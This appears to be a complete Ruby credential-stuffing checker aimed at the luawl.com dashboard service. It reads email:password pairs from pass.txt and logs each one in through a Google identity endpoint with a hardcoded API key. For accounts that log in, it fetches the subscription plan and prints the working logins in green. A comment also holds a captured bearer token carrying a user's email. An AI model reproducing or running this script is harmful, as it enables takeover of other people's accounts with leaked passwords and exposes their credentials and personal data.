require 'net/http'
require 'uri'
require 'json'

api_key = "AIzaSyCio3wiwvwX1bkk5lSNXMnT6maKMPkfgrQ"

def get_token(uemail, upass, key)
  uri = URI.parse("https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=" + key)
  request = Net::HTTP::Post.new(uri)
  request.content_type = "application/json"
  request.body = JSON.dump({
    "returnSecureToken" => true,
    "email" => uemail,
    "password" => upass,
  })
  req_options = {
    use_ssl: uri.scheme == "https",
  }
  response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
    http.request(request)
  end

  json = JSON.parse(response.body)
  return json["idToken"]
end

#POST /validateLoginFB.php HTTP/2
#Host: api2.luawl.com
#Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ijk5NjJmMDRmZWVkOTU0NWNlMjEzNGFiNTRjZWVmNTgxYWYyNGJhZmYiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vbHVhLXdoaXRlbGlzdCIsImF1ZCI6Imx1YS13aGl0ZWxpc3QiLCJhdXRoX3RpbWUiOjE2NjUwMjMwNTEsInVzZXJfaWQiOiJMU2x4VHJ6eno1VVRDb3Z6ZmFQeXZYMlZ1Q3AxIiwic3ViIjoiTFNseFRyenp6NVVUQ292emZhUHl2WDJWdUNwMSIsImlhdCI6MTY2NTM1OTc3MCwiZXhwIjoxNjY1MzYzMzcwLCJlbWFpbCI6ImJyb2dheUBnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsiYnJvZ2F5QGdtYWlsLmNvbSJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.SdzYlrUVZSPBzftAiXgxv_mzVmx9gj8QCgn54vjDhTdzdlVVZHeFfM7Eo7bpLllACAUdoLnPvL0GdFKP6_Br-tiGvj8My6B2vGi22EOaYJGNfMCuQdQ-47vPz-LN42zybiq2qGYPjpfzGuXXUpV-Yfe8l2fg75EeGiccJL3cPZgozpMqGzUJpB9AeIbHqxn4KmjAwRoMyOMDxKx8g9CL5AV9Ai5TBEdksI8Mz7-yCZE4K1r5Dw9gM-9p18_N2qIVSNpXT_VAkBEdWKjI2Ee0ErSdJ353YpPTdbTkDPiCcCslwdXqAFAWs6AiuZd1MdUZ3pKKhSOvLmZUEdkBn61_5A
#{}

def get_plan(token)
  uri = URI.parse("https://api2.luawl.com/validateLoginFB.php")
  request = Net::HTTP::Post.new(uri)
  request["Authorization"] = "Bearer " + token
  request["Origin"] = "https://dashboard.luawl.com"
  request["Sec-Fetch-Site"] = "same-site"
  request["Sec-Fetch-Mode"] = "cors"
  request["Sec-Fetch-Dest"] = "empty"
  request["Host"] = "api2.luawl.com"
  request["Content-Type"] = "application/json"
  request["Referer"] = "https://dashboard.luawl.com/"
  req_options = {
    use_ssl: uri.scheme == "https",
  }
  response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
    http.request(request)
  end

    json = JSON.parse(response.body)
    return json["data"][0]["plan_name"]

end

def get_tokens_from_file(file, key)
  File.open(file).each do |line|
    email, pass = line.split(":")
    token = get_token(email, pass, key)
    if token.nil?
      puts "\e[31m" + line + "\e[0m"
    else
      plan = get_plan(token)
      puts "\e[32m" + line + "\e[0m" + " - " + plan
    end
  end
end

get_tokens_from_file("pass.txt", api_key)
